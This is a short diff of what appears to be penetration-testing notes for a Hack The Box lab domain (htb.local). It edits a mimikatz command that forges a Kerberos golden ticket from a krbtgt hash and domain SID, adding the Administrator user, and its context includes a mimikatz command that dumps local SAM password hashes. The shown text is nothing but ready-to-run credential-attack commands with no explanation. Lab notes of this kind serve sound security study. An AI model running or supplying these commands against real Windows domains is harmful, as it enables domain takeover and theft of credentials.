@@ -621,7 +621,7 @@ whoami /user
 
 # golden ticket
 whoami /user
-.\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /ptt /domain:htb.local /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:cc36cf7a8514893efccd332446158b1a" "exit"
+.\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /ptt /user:Administrator /domain:htb.local /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:cc36cf7a8514893efccd332446158b1a" "exit"
 
 # lsadump
 .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
